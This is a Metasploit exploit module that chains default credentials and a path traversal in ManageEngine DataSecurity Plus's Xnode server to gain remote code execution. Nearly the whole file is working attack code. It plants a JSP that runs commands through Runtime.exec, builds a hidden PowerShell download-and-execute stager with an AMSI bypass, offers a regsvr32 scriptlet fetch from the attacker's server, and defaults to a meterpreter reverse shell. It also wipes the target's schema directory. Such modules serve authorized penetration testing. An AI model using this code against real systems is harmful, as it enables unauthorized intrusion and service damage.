##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Auxiliary::ManageengineXnode
  include Msf::Exploit::Powershell
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ManageEngine DataSecurity Plus Xnode Directory Traversal RCE',
        'Description' => %q{
          This module exploits default credentials (CVE-2020-11532) and a path
          traversal vulnerability (CVE-2020-11531) in the DataEngine Xnode server
          in ManageEngine DataSecurity Plus versions prior to 6.0.1 (6011). These
          issues are chained in order to achieve remote code execution with local
          administrator privileges.

          The module first tries to authenticate to the Xnode server using default
          credentials. If this works, it then requests the Xnode version. If the
          target seems vulnerable, the module sends a dr:/dr_schema_sync action
          request to the Xnode server, which exploits directory traversal to write
          a malicious JSP file to the web root at <install_dir>\webapps\fap\. It
          will then try to execute the JSP file via a simple HTTP GET request.

          This module has been successfully tested against ManageEngine
          DataSecurity Plus version 6.0.1 (6010) running on Windows Server 2012.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Sahil Dhar', # discovery and PoC (for authentication only)
          'Erik Wynter', # @wyntererik - additional research and Metasploit
        ],
        'References' => [
          ['CVE', '2020-11531'],
          ['CVE', '2020-11532'],
          ['PACKETSTORM', '157604']
        ],
        'Platform' => 'win',
        'Arch' => [ ARCH_X64, ARCH_X86 ],
        'Targets' => [
          [
            'DataSecurity Plus', {
              'Arch' => [ARCH_X64, ARCH_X86],
              'DefaultOptions' => {
                'RPORT' => 8800,
                'XNODE_PORT' => 29119
              }
            }
          ],
        ],
        'DefaultOptions' => {
          'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp',
          'Powershell::exec_in_place' => true
        },
        'DefaultTarget' => 0,
        'Privileged' => true,
        'DisclosureDate' => '2020-05-08',
        'Notes' => {
          # the data repository schema files in <datasecurity_install_dir>\apps\dataengine-xnode\conf\datarepository\schema will be wiped
          # by default, the module will upload default schema files to restore the service, but this may lead to resource loss for non-default configs
          'Stability' => [ SERVICE_RESOURCE_LOSS ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, CONFIG_CHANGES ],
          'Reliability' => [ REPEATABLE_SESSION ] # this is true only if RESTORE_SCHEMA_DIR is set to true (default configuration)
        }
      )
    )

    register_options [
      OptBool.new('CUSTOM_PAYLOAD', [false, 'Enable use of payloads other than windows/x64/meterpreter/reverse_*', false]),
      OptBool.new('RESTORE_SCHEMA_DIR', [false, 'Upon successful exploitation, repopulate <datasecurity_install_dir>\apps\dataengine-xnode\conf\datarepository\schema with the default JSON files', true]),
      OptInt.new('XNODE_PORT', [ true, 'The Xnode port', nil]),
      OptBool.new('WEB_DELIVERY_VIA_PSH', [ true, 'If enabled (default), the module will use only Powershell (in memory) to deliver the payload. If disabled, the Regsvr32 web delivery method is used', true]),
    ]

    register_advanced_options(
      [
        OptBool.new('PSH-AmsiBypass', [ true, 'PSH - Request AMSI/SBL bypass before the stager', true ]),
        OptString.new('PSH-AmsiBypassURI', [ false, 'PSH - The URL to use for the AMSI/SBL bypass (Will be random if left blank)', '' ]),
        OptBool.new('PSH-EncodedCommand', [ true, 'PSH - Use -EncodedCommand for web_delivery launcher', true ]),
        OptBool.new('PSH-ForceTLS12', [ true, 'PSH - Force use of TLS v1.2', true ]),
        OptBool.new('PSH-Proxy', [ true, 'PSH - Use the system proxy', true ]),
        OptString.new('PSHBinary-PATH', [ false, 'PSH (Binary) - The folder to store the file on the target machine (Will be %TEMP% if left blank)', '' ]),
        OptString.new('PSHBinary-FILENAME', [ false, 'PSH (Binary) - The filename to use (Will be random if left blank)', '' ]),
      ]
    )
  end

  def custom_payload
    datastore['CUSTOM_PAYLOAD']
  end

  def restore_schema_dir
    datastore['RESTORE_SCHEMA_DIR']
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def xnodeport
    datastore['XNODE_PORT']
  end

  def web_delivery_via_psh
    datastore['WEB_DELIVERY_VIA_PSH']
  end

  def web_root_dir
    'C:\Program Files (x86)\ManageEngine\DataSecurity Plus\webapps\fap\\'
  end

  def amsi_bypass_uri
    unless datastore['PSH-AmsiBypassURI'].empty?
      @amsi_uri = datastore['PSH-AmsiBypassURI']
    end
    @amsi_uri ||= random_uri
  end

  def gen_psh(url, *method)
    ignore_cert = Rex::Powershell::PshMethods.ignore_ssl_certificate if ssl
    force_tls12 = Rex::Powershell::PshMethods.force_tls12 if datastore['PSH-ForceTLS12']

    if method.include? 'string'
      download_string = datastore['PSH-Proxy'] ? Rex::Powershell::PshMethods.proxy_aware_download_and_exec_string(url) : Rex::Powershell::PshMethods.download_and_exec_string(url)
    else
      # Random filename to use, if there isn't anything set
      random = "#{rand_text_alphanumeric(8)}.exe"

      # Set filename (Use random filename if empty)
      filename = datastore['PSHBinary-FILENAME'].blank? ? random : datastore['PSHBinary-FILENAME']

      # Set path (Use %TEMP% if empty)
      path = datastore['PSHBinary-PATH'].blank? ? '$env:temp' : %('#{datastore['PSHBinary-PATH']}')

      # Join Path and Filename
      file = %(echo (#{path}+'\\#{filename}'))

      # Generate download PowerShell command
      download_string = Rex::Powershell::PshMethods.download_run(url, file)
    end

    download_and_run = "#{force_tls12}#{ignore_cert}#{download_string}"

    # Generate main PowerShell command
    if datastore['PSH-EncodedCommand']
      download_and_run = encode_script(download_and_run)
      return generate_psh_command_line(noprofile: true, windowstyle: 'hidden', encodedcommand: download_and_run)
    end

    return generate_psh_command_line(noprofile: true, windowstyle: 'hidden', command: download_and_run)
  end

  def rand_class_id
    "#{Rex::Text.rand_text_hex(8)}-#{Rex::Text.rand_text_hex(4)}-#{Rex::Text.rand_text_hex(4)}-#{Rex::Text.rand_text_hex(4)}-#{Rex::Text.rand_text_hex(12)}"
  end

  def gen_sct_file(command)
    %{<?XML version="1.0"?><scriptlet><registration progid="#{rand_text_alphanumeric(8)}" classid="{#{rand_class_id}}"><script><![CDATA[ var r = new ActiveXObject("WScript.Shell").Run("#{command}",0);]]></script></registration></scriptlet>}
  end

  def on_request_uri(cli, request)
    if request.raw_uri.to_s.ends_with?('.sct')
      vprint_status('Handling .sct Request')
      psh = gen_psh(get_uri.to_s, 'string')

      if web_delivery_via_psh
        vprint_error('Unexpected request for .sct file')
        # nuke the server
        service.stop
      else
        data = gen_sct_file(psh)
        send_response(cli, data, 'Content-Type' => 'text/plain')
      end
      return
    end

    if request.raw_uri.to_s.ends_with?(amsi_bypass_uri)
      data = bypass_powershell_protections
      vprint_status("Delivering AMSI Bypass (#{data.length} bytes)")
      send_response(cli, data, 'Content-Type' => 'text/plain')
      return
    end

    data = cmd_psh_payload(
      payload.encoded,
      payload_instance.arch.first
    )

    print_status("Delivering Payload (#{data.length} bytes)")
    send_response(cli, data, 'Content-Type' => 'application/octet-stream')
  end

  def conf_restore_fail_warning
    print_warning('The remote Data Security directory apps\dataengine-xnode\conf\datarepository\schema is now empty, which will break functionality of the Xnode server.')
    print_warning('Consider uploading the default datarepository schema files manually.')
  end

  def on_new_session(cli)
    # nuke the server
    service.stop

    unless cli.type.to_s.eql? 'meterpreter'
      print_warning("Manual cleanup of the JSP payload is required. The file may be located at #{web_root_dir}#{@jsp_name}")
      if restore_schema_dir
        print_warning('Detected non-meterpreter shell. Cannot perform repopulation of the apps\dataengine-xnode\conf\datarepository\schema directory with the default JSON files.')
      end
      conf_restore_fail_warning
      return
    end

    print_good('We got a session! Please be patient while cleanpup is performed. This may take a while.')
    cli.core.use('stdapi') if !cli.ext.aliases.include?('stdapi')
    pwd = cli.fs.dir.pwd
    try_to_restore = true

    # on a default install, the Xnode installation path is:
    # "C:\Program Files (x86)\ManageEngine\DataSecurity Plus\apps\dataengine-xnode" or possibly C:\Program Files\ManageEngine\DataSecurity Plus\apps\dataengine-xnode
    # the default directory where we pop a shell is:
    # "C:\Program Files (x86)\ManageEngine\DataSecurity Plus\bin or possibly C:\Program Files\ManageEngine\DataSecurity Plus\bin
    # if we have the xnode install path and it doesn't match the default, or the pwd doesn't match the default, it may be safer not to upload the default schema files
    if @xnode_install_path && @xnode_install_path.ends_with?('ManageEngine\DataSecurity Plus\apps\dataengine-xnode')
      file_to_delete = "#{@xnode_install_path.gsub('apps\dataengine-xnode', 'webapps\fap')}\\#{@jsp_name}"
    elsif pwd && pwd.end_with?('ManageEngine\DataSecurity Plus\bin')
      file_to_delete = "#{pwd.gsub('bin', 'webapps\fap')}\\#{@jsp_name}"
    else
      if restore_schema_dir
        vprint_warning('Detected a non-default installation directory. The module will not attempt to upload of the datarepostiory schema files.')
        try_to_restore = false
      end
      # guess the absolute path to the JSP payload by using the default. this is unlikely to work, but we can still try
      file_to_delete = "#{web_root_dir}#{@jsp_name}"
    end

    if cli.fs.file.exist?(file_to_delete)
      begin
        cli.fs.file.rm(file_to_delete)
        if cli.fs.file.exist?(file_to_delete)
          print_error("Failed to delete the JSP payload from #{file_to_delete}")
          print_warning('Manual cleanup is required.')
        else
          print_good("Successfully removed the JSP payload from #{file_to_delete}.")
        end
      rescue StandardError => e
        print_error("Encountered the following error when trying to delete the JSP payload from #{file_to_delete}.")
        print_error(e)
        print_warning('Manual cleanup is required.')
      end
    else
      print_error('Unable to delete the JSP payload because it is not in the expected location.')
      print_warning('Manual cleanup is required.')
    end

    # check if we should proceed with restoring the default JSON files to the schema directory
    unless restore_schema_dir && try_to_restore
      conf_restore_fail_warning
      return
    end

    unless Dir.exist?(@xnode_schema_local_path)
      print_error("The local directory #{@xnode_schema_local_path} does not exist. Cannot upload the datarepostiory schema files.")
      conf_restore_fail_warning
      return
    end

    print_status('Attempting to repopulate apps\dataengine-xnode\conf\datarepository\schema with the default JSON files.')

    begin
      missing_file_ct = 0
      # upload the default datarepostiory schema files to the target, since the exploit has wiped them, which will break the app
      Dir.foreach(@xnode_schema_local_path) do |f|
        next if (f == '.') || (f == '..')

        local_path = "#{@xnode_schema_local_path}/#{f}"
        remote_path = "#{@xnode_schema_remote_path}/#{f}"
        vprint_status("Uploading #{f} to #{remote_path}...")
        cli.fs.file.upload_file(remote_path, local_path)
      end
    rescue StandardError => e
      missing_file_ct += 1
      print_error("Unable to upload the configuration file #{f} to #{remote_path}.")
      vprint_error("Encountered the following error: #{e}")
    end

    if missing_file_ct == 0
      print_good('Successfully uploaded the default Xnode datarepostiory schema files.')
    else
      print_warning('Failed to upload all default Xnode datarepostiory schema files. Consider uploading these manually.')
    end
  end

  def check
    @sock = Rex::Socket::Tcp.create(
      'PeerHost' => rhost,
      'PeerPort' => xnodeport
    )

    res = send_to_sock(@sock, action_authenticate(username, password))

    print_line # prevent awkward printing of the vulnerability status or another statement next to the module name instead of on a new line
    unless res.instance_of?(Hash) && res.keys.include?('response') && res['response'].instance_of?(Hash)
      return Exploit::CheckCode::Unknown('Received unexpected response. The target may not be an Xnode server.')
    end

    if res['response']['status'] == 'authentication_success'
      print_good('Successfully authenticated to the Xnode server')
      # get the Xnode info, so we can check the Xnode version. This should be XNODE_1_0_0
      res_info = send_to_sock(@sock, action_xnode_info)
      unless res_info.instance_of?(Hash) && res_info.keys.include?('response') && res_info['response'].instance_of?(Hash)
        print_warning('Received unexpected response while trying to obtain the Xnode version and installation path via the "xnode_info" action. Enumeration may not work.')
        return Exploit::CheckCode::Unknown('Received unexpected response. The target may not be an Xnode server.')
      end

      if res_info['response'].keys.include?('xnode_installation_path')
        @xnode_install_path = res_info['response']['xnode_installation_path']
        print_status("Obtained Xnode installation path: '#{@xnode_install_path}'.")
      else
        print_warning('Failed to obtain the Xnode installation path.')
      end

      if res_info['response'].keys.include?('xnode_version')
        xnode_version = res_info['response']['xnode_version']
        if xnode_version == 'XNODE_1_0_0'
          return Exploit::CheckCode::Appears("Target is running Xnode version: #{xnode_version}")
        else
          return Exploit::CheckCode::Safe("Target is running Xnode version: #{xnode_version}")
        end
      end

      return Exploit::CheckCode::Detected('Failed to obtain the Xnode version.')
    end

    if res['response'].include?('error_msg')
      case res['response']['error_msg']
      when 'Authentication failed!'
        return Exploit::CheckCode::Safe('Failed to authenticate to the Xnode server.')
      when 'Remote request-processing disabled!!'
        return Exploit::CheckCode::Safe('Remote request-processing is disabled on the Xnode server.')
      end
    end

    return Exploit::CheckCode::Unknown('Received unexpected response. The target may not be an Xnode server.')
  end

  def action_dr_sync(trav_path, pl)
    hm_key = rand_text_alpha_lower(6..12)
    {
      'action' => 'dr:/dr_schema_sync',
      'request_id' => 1,
      'dr_schema_list' => {
        trav_path => {
          hm_key => "<% Runtime.getRuntime().exec(new String(new byte[] {#{pl}})); %>"
        }
      }
    }
  end

  def pop_thy_shell(_jsp_name)
    jsp_uri = normalize_uri(target_uri.path, @jsp_name)

    print_status("Requesting JSP payload: #{full_uri(jsp_uri)}")

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => jsp_uri
    )

    unless res && res.code == 200
      # nuke the server
      service.stop
      fail_with(Failure::PayloadFailed, 'Failed to request JSP payload')
    end

    print_good('Successfully requested JSP payload')
  end

  def primer
    # currently, only windows/x64/meterpreter/reverse_* payloads seem to be working. It may be useful to inform users about this.
    if !datastore['PAYLOAD'].start_with?('windows/x64/meterpreter/reverse_') && !custom_payload
      fail_with(Failure::BadConfig, 'Payloads other than windows/x64/meterpreter/reverse_* may not work. To enable additional payloads, set CUSTOM_PAYLOAD to true.')
    end

    if web_delivery_via_psh
      uri = get_uri
      if datastore['PSH-AmsiBypass']
        amsi_uri = uri + amsi_bypass_uri
        wd_cmd = gen_psh([amsi_uri, uri], 'string').to_s
      else
        wd_cmd = gen_psh(uri, 'string').to_s
      end
    else
      wd_cmd = %(regsvr32 /s /n /u /i:#{get_uri}.sct scrobj.dll)
    end

    @jsp_name = rand_text_alpha_lower(6..12) + '.jsp'

    trav_path = "../../../../../webapps/fap/#{@jsp_name}"
    @xnode_schema_local_path = ::File.join(Msf::Config.data_directory, 'exploits', 'manageengine_xnode', 'CVE-2020-11531', 'DataSecurityPlus')
    @xnode_schema_remote_path = 'C:\Program Files (x86)\ManageEngine\DataSecurity Plus\apps\dataengine-xnode\conf\datarepository\schema'

    # get the Xnode health status
    res_health = send_to_sock(@sock, action_admin_health)
    unless res_health.instance_of?(Hash) && res_health.keys.include?('response') && res_health['response'].instance_of?(Hash) && res_health['response'].keys.include?('de_health')
      print_warning('Received unexpected response while trying to obtain the Xnode "de_health" status. Enumeration may not work.')
    end

    if res_health['response']['de_health'] == 'GREEN'
      print_status('Obtained expected Xnode "de_healh" status: "GREEN".')
    else
      print_warning("Obtained unexpected Xnode \"de_healh\" status: \"#{res_health['response']['de_health']}\"")
    end

    action_hash = action_dr_sync(trav_path, wd_cmd.bytes.join(', '))
    send_to_sock(@sock, action_hash)
    print_line # to pevent awkward printing on line with module name
    vprint_status("Using the web_delivery command: #{wd_cmd}")
    print_warning('This exploit will wipe the contents in the <datasecurity_install_dir>\apps\dataengine-xnode\conf\datarepository\schema directory.')
    print_warning('If that directory remains empty, Xnode will stop working and it will not be possible to reboot DataSecurity Plus.')
    if restore_schema_dir
      print_warning('This module will try to repopulate the directory with the default JSON files, but that may impact functionality for a non-default configuration.')
    end
    pop_thy_shell(@jsp_name)
  end
end
